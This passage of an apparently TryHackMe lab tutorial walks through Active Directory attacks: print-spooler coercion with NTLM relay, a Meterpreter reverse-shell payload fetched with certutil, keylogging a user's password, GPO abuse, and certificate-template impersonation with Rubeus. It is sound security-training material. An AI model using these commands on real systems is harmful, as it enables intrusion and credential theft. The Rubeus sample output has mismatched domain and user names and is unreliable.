  1 WinRM1          thmserver1.z... RemoteMachine   Opened        Microsoft.PowerShell     Available

PS C:\> Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc
[thmserver1.za.tryhackme.loc]: PS C:\Users\t1_trevor.jones\Documents> whoami
za\t1_trevor.jones`

With the exploitation of Constrained Delegation, we now have privileged access to THMSERVER1!

**Exploiting Automated Relays**

In this task we 
will take a look at some automated relays. Authentication attempts are 
constantly flying across the network, and as shown in the Breaching AD
 room, if we are lucky, we can intercept some of these challenges to 
gain access. But what if we don't like to wait? What if we can coerce 
authentication to occur?

Although we already have 
privileged access to THMSERVER1, we could be in a position where we did 
not have access to a constrained delegation exploit. This is another 
excellent attack that can be performed to gain privileged access to 
hosts.

# Machine Accounts

All
 Windows hosts have a machine account. Essentially, this is the user 
account associated with the machine. Unless someone tampered with the 
account of the host, the passwords of these accounts are uncrackable. By
 default, they are 120 characters (UTF16) long and are automatically 
rotated every 30 days.

In AD,
 these machine accounts are used quite a bit in different services. 
Different domain controllers use their machine accounts to synchronise 
AD updates and changes. When you request a certificate on behalf of the 
host you are working on, the machine account of that host is used for 
authentication to the AD Certificate Service.

There is an exceptional case in AD,
 where one machine has admin rights over another machine. Essentially in
 the AD configuration, administrative permissions over a host have been 
granted to another host. Again, this is expected functionality such as 
domain controllers or SQL clusters that must be synchronised. However, 
these instances provide a very interesting attack vector for coercing 
authentication.

We first need to identify cases where a 
machine account has administrative access over another machine. We can 
use Bloodhound for this, but it means we will have to write some custom 
cypher queries. Click the "Create Custom Query" in the Analysis tab in 
Bloodhound:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/6d3352c2ddd2b1013ed0cce50be2a2a4.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/6d3352c2ddd2b1013ed0cce50be2a2a4.png)

We want to write the following query:

`MATCH p=(c1:Computer)-[r1:MemberOf*1..]->(g:Group)-[r2:AdminTo]->(n:Computer) RETURN p`

This
 query will attempt to find instances where a computer has the "AdminTo"
 relationship over another computer. You should see output similar to 
this:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/43d7164804282cedecd32a90c10c102b.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/43d7164804282cedecd32a90c10c102b.png)

This
 is very interesting. It shows us that the THMSERVER2 machine account 
has administrative privileges over the THMSERVER1 machine.

# The Printer Bug

*It's not a bug, it's a feature - Microsoft.*

Seriously,
 when this was reported, Microsoft responded that this was a feature. 
The printer bug is a "feature" of the MS-RPRN protocol (PrintSystem 
Remote Protocol), which allows a domain user to remotely force a target 
host running the Print Spooler service to authenticate to an arbitrary 
IP address. There have been a few of these bugs in recent years: 
Spooler, PetitPotam, PrintNightmare. Microsoft claims that the only bug 
is that some of these did not require AD credentials at all, but this issue has been resolved through security patches.

Therefore,
 to exploit this, apart from machine account administrative privileges, 
we also need to meet the following four conditions :

1. A valid set of AD account credentials.
2. Network connectivity to the target's SMB service.
3. The target host must be running the Print Spooler service.
4. The hosts must not have SMB signing enforced.

Condition 1 and 2 have been met already. The only two we need to ensure works are conditions 3 and 4.

# Print Spooler Service

We
 need to determine if the Print Spooler service is running. Since we 
don't have access to THMSERVER2, we need to query from the network 
perspective. In this case, we can use a WMI query from our SSH session on THMWRK1 to query the service's current state:

PowerShell

```
PS C:\> GWMI Win32_Printer -Computer thmserver2.za.tryhackme.loc

Location      :
Name          : Microsoft XPS Document Writer
PrinterState  : 0
PrinterStatus : 3
ShareName     :
SystemName    : THMSERVER2

Location      :
Name          : Microsoft Print to PDF
PrinterState  : 0
PrinterStatus : 3
ShareName     :
SystemName    : THMSERVER2
```

The
 output from the cmdlet verifies that the service is running. If we get 
an access denied error, you could perhaps attempt the PowerShell command of `Get-PrinterPort -ComputerName thmserver2.za.tryhackme.loc`.
 However, Microsoft has been cracking down viewing these ports from the 
network's perspective. If both give you an error, you may just need to 
take a leap of faith. Thus, condition three has been met.

# SMB

In order to relay the coerced authentication attempt, SMB
 signing should not be enforced. It should be noted that there is a 
difference between SMB signing being allowed and SMB signing being 
enforced. Since some legacy systems do not support SMB signing, by 
default, the configuration of SMB is that signing is allowed but not 
enforced, meaning that it will only be used if supported. Since we will 
be hosting a malicious SMB server, we can ensure our server does not 
support signing, forcing the target not to sign the SMB authentication 
attempt.

To verify that THMSERVER1 and THMSERVER2 do not have SMB signing enforced, we can use Nmap on our AttackBox:

Terminal

```
thm@thm:~# nmap --script=smb2-security-mode -p445 thmserver1.za.tryhackme.loc thmserver2.za.tryhackme.locNmap scan report for distributor.za.tryhackme.loc (172.31.1.201)
Host is up (0.62s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required

Nmap scan report for 172.31.1.202
Host is up (0.38s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required

Nmap done: 2 IP addresses (2 hosts up) scanned in 4.59 seconds
```

We can see that SMB signing is enabled but not enforced based on the output. This means all our conditions are met, and we can start the attack!

# Exploiting Authentication Relays

**Note:
 This attack can be unstable. Abusing the Print Spooler service may 
cause it to crash, and a callback is not always guaranteed. For this 
reason, the previous task already provided you with the permissions 
required to continue. However, understanding authentication relays and 
how to force them is essential for AD
 exploitation. As such, the steps to perform such an attack are provided
 below. You can decide to give it a go, but a callback is not 
guaranteed. If it does not work, move on to the next task and perhaps 
explore this again at the end of your room journey.**

We will be using [SpoolSample](https://github.com/leechristensen/SpoolSample) to exploit the authentication relay. It is a C# exploit but has already been compiled for you and stored in the `C:\Tools\` directory on THMWRK1.  We will use Spoolsample.exe to coerce THMSERVER2 to authenticate to us on our AttackBox and then [Impacket](https://github.com/SecureAuthCorp/impacket)'s [ntlmrelayx.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) to relay the authentication attempt THMSERVER1. Note that if you are using your own VM, you will need to make sure you have the updated version of Impacket that supports SMBv2.

The first step is to set up the NTLM relay. On our AttackBox, we can use the following:

Terminal

```
thm@thm:~# python3.9 /opt/impacket/examples/ntlmrelayx.py -smb2support -t smb://"THMSERVER1 IP" -debug
```

If we specify the hostname of THMSERVER1 instead of the IP, the host could request that we use Kerberos
 authentication instead of NTLM. Hence we should specify the IP instead.
 With the relay listening, we can now coerce THMSERVER2 to authenticate 
to us. In an SSH terminal on THMWRK1, execute the following:

Terminal

```
C:\Tools\>SpoolSample.exe THMSERVER2.za.tryhackme.loc "Attacker IP"
```

Your
 attacker IP should correspond with your tunX interface for the network.
 If all goes well, you should have received an authentication attempt 
and a relay to THMSERVER1.

Terminal

```
thm$ python3.9 ntlmrelayx.py -smb2support -t smb://"THMSERVER1 IP" -c 'whoami /all' -debug[*] Servers started, waiting for connections
[*] SMBD-Thread-5: Received connection from 172.31.1.202, attacking target smb://172.31.1.201
[*] Authenticating against smb://172.31.1.201 as ZA/THMSERVER2$ SUCCEED
[+] No more targets
[*] SMBD-Thread-7: Connection from 172.31.1.202 controlled, but there are no more targets left!
[+] No more targets
[*] SMBD-Thread-8: Connection from 172.31.1.202 controlled, but there are no more targets left!
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[+] ExecuteRemote command: %COMSPEC% /Q /c echo whoami /all ^> %SYSTEMROOT%\Temp\__output > %TEMP%\execute.bat & %COMSPEC% /Q /c %TEMP%\execute.bat & del %TEMP%\execute.bat
[*] Executed specified command on host: 172.31.1.201

USER INFORMATION
----------------

User Name           SID
=================== ========
nt authority\system S-1-5-18

GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
BUILTIN\Administrators                 Alias            S-1-5-32-544 Enabled by default, Enabled group, Group owner
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
Mandatory Label\System Mandatory Level Label            S-1-16-16384
[...]

```

This output resembles what would happen if you used the

```
-c 'whoami /all'
```

command. However by specifying no command, you should now have 
performed a hashdump. These credentials can now be used to get a shell 
on the host!

**Exploiting AD Users**

We have gotten 
quite far with our exploitation up to this point. We have full 
administrative access to workstations and servers. Essentially, we can 
perform post-exploitation on almost any Tier 1 and Tier 2 system. But we
 still want to go further. This next task can also be seen as 
post-exploitation but is often an excellent thing to use when we are 
still performing exploitation to reach a suitable position for goal 
execution. It is time for us to target AD users.

# Users and User Behavior

*The
 factory of the future will only have two employees. A human and a dog. 
The human will be there to feed the dog. The dog will be there to bite 
the human if they try to touch something. - Warren Bennis*

Users
 are, unfortunately, often the weakest link in the security chain. Just 
think about weak passwords and bad habits, such as granting overly 
permissive permissions. It would be ignorant and ineffective to overlook
 this attack surface. While it is good to build up a proper enumeration 
and attack methodology against AD users, in this task, we will focus on two elements:

- Credential Management - How users store their credentials. In AD, this is quite important since users may have multiple sets of credentials and remembering all of them can be a hassle.
- Keylogging - Often, during exploitation, we need to understand how normal users
interact with a system. Together with screengrabs, Keylogging can be a
useful tool to gain this understanding from an attacker's perspective.

# Hunting for Credentials

Now
 that we have compromised THMSERVER1, we should probably look around to 
see if there is any useful information. Have a look at the user 
directories and see if there is some useful information in any of them.

Your
 enumeration efforts should lead you to a .kdbx file. A quick Google 
should confirm our suspicion that this file is indeed very valuable! We 
can use Meterpreter's download command to recover this file.

This 
file seems to be a credential database. The issue, however, is that the 
database is encrypted with a password. We could attempt to crack the 
password, but anyone who uses a credential database usually has the 
savvy to make sure the initial password is secure. We may have more 
success seeing how the user interacts with this database.

# SYSTEM is Sometimes Too Privileged

Meterpreter
 has a built-in keylogger. This will be useful for extracting the user's
 keystrokes. However, we can't just start this keylogger and hope for 
the best since our shell is currently running in the SYSTEM context. 
SYSTEM won't be typing any keystrokes, so this won't help us. To capture
 the correct user's credentials, we will need to ensure that our shell 
is running in the context of that user.

Fortunately, Meterpreter
 provides us with a migrate feature, and since we are running as SYSTEM,
 we should be able to migrate to any process. You have remote code 
execution on THMSERVER1, use this to get a Meterpreter shell. If you 
need a recap on using Meterpreter and Metasploit, [here is a module on its use.](https://tryhackme.com/module/metasploit) However for a quick rundown, you can use the following command to generate a PowerShell meterpreter payload:

`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=exploitad LPORT="Listening port" -f psh -o shell.ps1`

You can then also use the following to create the associated listener in the msfconsole:

`sudo
 msfconsole -q -x "use exploit/multi/handler; set PAYLOAD 
windows/x64/meterpreter/reverse_tcp; set LHOST exploitad; set LPORT 
"listening port'; exploit"`

You can host your meterpreter shell using a Python webserver and then copy it using something like this:

`certutil.exe -urlcache -split -f http:///shell.ps1`

Once
 you have a meterpreter shell, you can continue. The first step is to 
see if the users have any running processes on this machine:

Terminal

```
meterpreter\>ps | grep "explorer"
Filtering on 'explorer'

Process List
============

 PID   PPID  Name          Arch  Session  User                     Path
 ---   ----  ----          ----  -------  ----                     ----
 3612  3592  explorer.exe  x64   1        THMSERVER1\trevor.local  C:\Windows\explorer.exe
```

**Note:**
 If you do not see an explorer.exe process for the trevor.local user, 
you can start the process yourself by performing the following steps:

1. Reset the password of the trevor.local user using the following command: `net user trevor.local <chosen password>`
2. Run the following in powershell: `C:\auto-login.ps1 trevor.local <chosen password> THMSERVER1`
3. Reboot the server using `shutdown -r`
4. Once the server is back online, you should see the explorer process.

It
 seems like we are lucky! The user has an active session on THMSERVER1. 
Let's migrate to a process of this user. The safest bet is usually 
sometime like explorer.exe:

Terminal

```
meterpreter\>migrate 3612
[*] Migrating from 4408 to 3612...
[*] Migration completed successfully.
```

We can confirm that we are now running in the context of our target using the getuid command:

Terminal

```
meterpreter\>getuid
Server username: THMSERVER1\trevor.local
```

Now we are ready to start our keylogger:

Terminal

```
meterpreter\>keyscan_start
Starting the keystroke sniffer ...
```

Now
 we have to be patient and wait. If we are lucky, we will capture some 
credentials! Give it a couple of minutes, and then run the following to 
dump captured keystrokes:

Terminal

```
meterpreter\>keyscan_dump
Dumping captured keystrokes...
keep<CR>
<Shift>Passwordpasswordpassword<CR>
```

This is a straightforward example of targeting AD
 users. There is a lot more that can be done. It is essential to include
 user targeting in your exploitation methodology for AD. To answer the 
questions for this task you will need Keepass. It has been installed on 
the AttackBox for you so you can just search for and run the 
application. If you are using your own VM, on most Linux distros `sudo apt install keepassx` will work. Or you can download it from [here](https://keepass.info/download.html). Also make sure to use the meterpreter `download`
 command to download the Keepass database to you host. If you are using 
Kali, make sure that the kali user owns the database file before you 
open it, otherwise it might lock the database and give you incorrect 
results.

Although persistence will only be discussed in the next 
room, now might be a good time to create a local account on THMSERVER1 
and grant it admin rights so you have a good foothold. Since this is not
 really needed for the rest of the tasks, if you want to do this, you 
will need to do a bit of research on this yourself.

**Exploiting GPOs**

Keylogging the 
user allowed us to decrypt their credential database, providing us with 
credentials that can be useful to further our goal of AD
 exploitation, namely the svcServMan account. We need to perform a bit 
of enumeration to figure out what these credentials will be useful for. 
Luckily for us, we already have Sharphound data that we can use. Using 
the search feature in Bloodhound, let's review the permissions that the 
discovered account has:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/adfa79bdc188b1c88a8200d44112bccf.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/adfa79bdc188b1c88a8200d44112bccf.png)

One permission, in particular, stands out for this account, ownership over a Group Policy Object (GPO). Furthermore, when we do a bit of investigation, it seems like this GPO is applied to our THMSERVER2 machine:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/3a911e2876de1ee5cda169cd2089a0ce.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/3a911e2876de1ee5cda169cd2089a0ce.png)

This may provide us with the ideal opportunity to further our AD exploitation!

# Group Policy Objects

Remember when we discussed the SYSVOL directory in Enumerating AD?
 This is the directory where AD GPOs are stored to be replicated to 
domain-joined machines. A GPO is a virtual collection of policy 
settings. Each GPO has a unique name, called a GUID. That's why if you 
try to read the contents of the SYSVOL directory, it won't make a lot of
 sense with all the random names.

Each Windows computer has a Local Policy Configuration. This contains several notable configurations such as:

- Application configuration for services such as the Firewall, Anti-Virus, and Applocker.
- Local Group membership such as the Administrator or Remote Desktop Users groups.
- Startup configuration such as scripts that should be executed.
- Security and protocol settings such as SMBv1 support.

These are just a few examples. There are a significant amount of configuration options that can be set.

# Group Policy Management

If
 you only have one Windows computer, it is easy to change the local 
policy configuration directly on the host. However, you need a mechanism
 to deploy a configuration from a central location in large 
organisations. This is where Group Policy Management (GPM) comes into 
play. Instead of defining policies locally on each machine, GPM allows 
us to define policies directly on the AD structure. Essentially, we can define GPOs for AD objects, such as a specific OU or group.

Domain-joined
 computers would then pull all policies from SYSVOL periodically and 
apply the relevant ones. By default, policies are replicated every 15 
minutes through the gpupdate application. We can, however, also manually
 execute this application from Command Prompt to apply policies 
instantly.

# Exploiting GPOs

Although there are several ways in which GPOs can be exploited, we will stick with the simple solution of adding an AD
 account we control to both the local Administrators and local Remote 
Desktop Users groups. This will allow us administrative privileges on 
THMSERVER2 and the ability to RDP in. We could also use the exposed SSH 
port, but not many organisations have upgraded to providing SSH access. 
Hence, RDP access or conventional lateral movement techniques like 
SMBExec are safer.

In order to modify the GPO,
 we need to access Group Policy Management as the AD user that has the 
relevant permissions. We could RDP into THMSERVER1 as the user, but that
 may kick the user out of their active session, raising suspicion. 
Instead, we will RDP into THMWRK1 with either our normal or our Tier 2 
Admin account, inject the AD user's credentials into memory using the 
runas command, and open MMC to modify the GPO. For a recap on the runas 
command, refer to the [Enumerating AD](http://tryhackme.com/room/adenumeration) room; however, the required command is also provided here that should be executed from an administrative command prompt window:

Command Prompt

```
C:\>runas /netonly /user:za.tryhackme.loc\<AD Username> cmd.exe
```

Once
 prompted, provide the password associated with the account. To verify 
that you provided the correct credentials, you can run `dir \\za.tryhackme.loc\sysvol`. In the newly spawned command prompt window, we can start the Microsoft Management Console:

Command Prompt

```
C:\>mmc
```

MMC screenshot.

We now want to add the Group Policy Management snap-in:

1. Click **File** -> **Add/Remove Snap-in**
2. Select the **Group Policy Management** snap-in and click **Add**
3. Click **Ok**

You should now be able to see GPOs for the za.tryhackme.com domain:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/3d922a91f644df47518d483f4081250f.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/3d922a91f644df47518d483f4081250f.png)

We can now navigate to the GPO that our user has permission to modify (Servers > Management Servers> Management Server Pushes).

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/134d978444497bb2cd443f23f5140189.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/134d978444497bb2cd443f23f5140189.png)

We can right-click on the GPO and select Edit. This will open the new Group Policy Management Editor window.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/2cc7d656ad4228036a52edca2f2bb531.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/2cc7d656ad4228036a52edca2f2bb531.png)

In order to add our account to the local groups, we need to perform the following steps:

1. Expand **Computer Configuration**
2. Expand **Policies**
3. Expand **Windows Settings**
4. Expand **Security Settings**
5. Right Click on **Restricted Groups** and select **Add Group** (If the **IT Support** group already exists, it means someone has already performed the
exploit. You can either delete it to create it yourself, or just inspect it to see what was configured.)
6. Click **Browse,** enter **IT Support** and click **Check Names**
7. Click **Okay** twice

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/f11e6ef429397c28b4748d1757f70b55.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/f11e6ef429397c28b4748d1757f70b55.png)

The
 first filter is not used. For the second filter, we want to add both 
the Administrators and Remote Desktop Users groups. In the end, it 
should look something like this:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/f6cb440043d8da6622a0d527c5bc3651.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/f6cb440043d8da6622a0d527c5bc3651.png)

Once the configuration has been made, we can click **Apply** and **OK**. Now, all we need to do is wait for a maximum of 15 minutes for the GPO to be applied. After this, our initial account that we made a member of the **IT Suppor**t group will now have administrative and RDP permissions on THMSERVER2!

**Exploiting Certificates**

Now that we have access to THMSERVER2, we have furthered our journey of exploiting AD
 by exploiting all Tier 1 assets (servers). However, we are again stuck 
without the simple means to move to the next tier. So again, we will 
need to look for more creative paths.

Research done and released as a [whitepaper](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
 by SpecterOps showed that it 
was possible to exploit misconfigured certificate templates for 
privilege escalation and lateral movement. If you want to better 
understand certificate misconfigurations and how to identify them, 
please have a look at [this room](http://tryhackme.com/jr/adcertificatetemplates).

# AD

AD Certificate Services (CS) is Microsoft's Public Key Infrastructure (PKI) implementation. 
Since AD provides a level of trust in an organisation, it can be used as
 a CA to prove and delegate trust. AD CS is used for several things, such
 as encrypting file systems, creating and verifying digital signatures, 
and even user authentication, making it a promising avenue for 
attackers.

Since AD CS is a privileged function, it usually runs on 
selected domain controllers. Meaning normal users can't really interact 
with the service directly. On the other side of the coin, organisations 
tend to be too large to have an administrator create and distribute each
 certificate manually. This is where certificate templates come in. 
Administrators of AD CS can create several templates that can allow any 
user with the relevant permissions to request a certificate themselves. 
These templates have parameters that say which user can request the 
certificate and what is required. SpecterOps found that 
specific combinations of these parameters can be incredibly toxic and abused for privilege escalation and persistent access.

Before we dive deeper into certificate abuse, some terminology:

- PKI - Public Key Infrastructure is a system that manages certificates and public key encryption
- AD CS - Active Directory Certificate Services is Microsoft's PKI implementation which usually runs on domain controllers
- CA - Certificate Authority is a PKI that issues certificates
- Certificate Template - a collection of settings and policies that defines how and when a certificate may be issued by a CA
- CSR - Certificate Signing Request is a message sent to a CA to request a signed certificate
- EKU - Extended/Enhanced Key Usage are object identifiers that define how a generated certificate may be used

# Finding Vulnerable Certificate Templates

In order to find vulnerable templates, we will use Window's built-in tool certutil. Using our RDP access on THMSERVER2, we can run the following Powershell script to enumerate certificates:

Powershell

```
C:\>certutil -Template -v > templates.txt
```

This will provide output on all configured templates. We could also use a certificate auditing tool such as Ghostpack's

[PSPKIAudit](https://github.com/GhostPack/PSPKIAudit)

.
 However, a manual approach allows us to make sure we find all possible 
misconfigurations. A certificate template is deemed misconfigured if a 
combination of parameter values becomes poisonous, allowing the 
requester to perform privilege escalation. In our case, we are looking 
for a template with the following poisonous parameter combination:

- **Client Authentication** - The certificate can be used for Client Authentication.
- **CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT** The certificate template allows us to specify the Subject Alternative Name (SAN).
- **CTPRIVATEKEY_FLAG_EXPORTABLE_KEY** - The certificate will be exportable with the private key.
- **Certificate Permissions** - We have the required permissions to use the certificate template.

If
 you are interested in learning more about poisonous parameter 
combinations, have a read of the whitepaper from SpecterOps. Since the 
aim of this room is to gain more broad knowledge of AD
 exploitation attacks, we will be pointing out that Template[32] is the 
vulnerable template. In this template, we can see that the machine 
account of THMSERVER2 can issue a CSR for a template that allows us to 
specify the Subject Alternative Name (SAN) and can be used for client 
authentication.

SpecterOps mentions eight common security misconfigurations with AD CS, so it should be noted that there are still a significant amount of potential misconfigurations that can be found.

# Exploiting a Certificate Template

Using RDP
 access on THMSERVER2, we will now request our certificate. If you use 
Remmina and save the config of the RDP connection, please make sure to 
disable **Restricted admin mode**. We will use the Microsoft Management Console (MMC):

1. Click **Start**>**run**
2. Type **mmc** and hit enter
3. Click **File**>**Add/Remove Snap-in..**
4. Add the **Certificates** snap-in and make sure to select **Computer Account** and **Local computer** on the prompts.
5. Click **OK**

You should now see the Certificate snap-in:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/4304fb96c8fc796a4e26801843abcd6c.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/4304fb96c8fc796a4e26801843abcd6c.png)

We will request a personal certificate:

1. Right Click on **Personal** and select **All Tasks**>**Request New Certificate...**
2. Click **Next** twice to select the AD enrollment policy.
3. You will see that we have one template that we can request, but first, we need to provide additional information.
4. Click on the **More Information** warning.
5. Change the **Subject name Type** option to **Common Name** and provide any value, since it does not matter, and click **Add**.
6. Change the **Alternative name Type** option to **User principal name**.
7. Supply the UPN of the user you want to impersonate. The best would be a DA
account such as Administrator@za.tryhackme.loc and click **Add.**

Your additional information should look something like this:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/20cd4305f7a15c9ceb3ddd8c96088b09.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/20cd4305f7a15c9ceb3ddd8c96088b09.png)

Once you are happy with it, click

**Apply**

and

**OK**

. Then, select the certificate and click

**Enroll**

. You should be able to see your certificate:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/6bed1474264e87f3be91e028a06b317b.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/6bed1474264e87f3be91e028a06b317b.png)

The last step is to export our certificate with the private key:

1. Right-click on the certificate and select **All Tasks**>**Export...**
2. Click **Next**, select **Yes, export the private key**, and click **Next**.
3. Click **Next**, then set a password for the certificate since the private key cannot be exported without a password.
4. Click **Next** and select a location to store the certificate.
5. Click **Next** and finally click **Finish.**

# User Impersonation through a Certificate

Now we can finally impersonate a user. To perform this, two steps are required:

- Use the certificate to request a Kerberos ticket-granting ticket (TGT)
- Load the Kerberos TGT into your hacking platform of choice

For the first step, we will be using [Rubeus](https://github.com/GhostPack/Rubeus). An already compiled version is available in the `C:\Tools\` directory. Open a command prompt window and navigate to this directory. We will use the following command to request the TGT:

`Rubeus.exe
 asktgt /user:Administrator /enctype:aes256 /certificate:`

Let's break down the parameters:

- **/user** - This specifies the user that we will impersonate and has to match the UPN for the certificate we generated
- **/enctype** -This specifies the encryption type for the ticket. Setting this is
important for evasion, since the default encryption algorithm is weak,
which would result in an overpass-the-hash alert
- **/certificate** - Path to the certificate we have generated
- **/password** - The password for our certificate file
- **/outfile** - The file where our TGT will be output to
- **/domain** - The FQDN of the domain we are currently attacking
- **/dc** - The IP of the domain controller which we are requesting the TGT from. Usually it is best to select a DC that has a CA service running

Once we execute the command, we should receive our TGT:

TGT Request

```
C:\THMTools> .\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:vulncert.pfx /password:tryhackme /outfile:administrator.kirbi /domain:za.tryhackme.loc /dc:12.31.1.101
          ______        _
         (_____ \      | |
          _____) )_   _| |__  _____ _   _  ___
         |  __  /| | | |  _ \| ___ | | | |/___)
         | |  \ \| |_| | |_) ) ____| |_| |___ |
         |_|   |_|____/|____/|_____)____/(___/

         v2.0.0

       [*] Action: Ask TGT

       [*] Using PKINIT with etype aes256_cts_hmac_sha1 and subject: CN=vulncert
       [*] Building AS-REQ (w/ PKINIT preauth) for: 'lunar.eruca.com\svc.gitlab'
       [+] TGT request successful!
       [*] base64(ticket.kirbi):

             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

         ServiceName              :  krbtgt/za.tryhackme.loc
         ServiceRealm             : ZA.TRYHACKME.LOC
         UserName                 : Adminsitrator
         UserRealm                : ZA.TRYHACKME.LOC
         StartTime                :  2/6/2022 5:54:46 PM
         EndTime                  :  2/7/2022 3:54:46 AM
         RenewTill                :  2/13/2022 5:54:46 PM
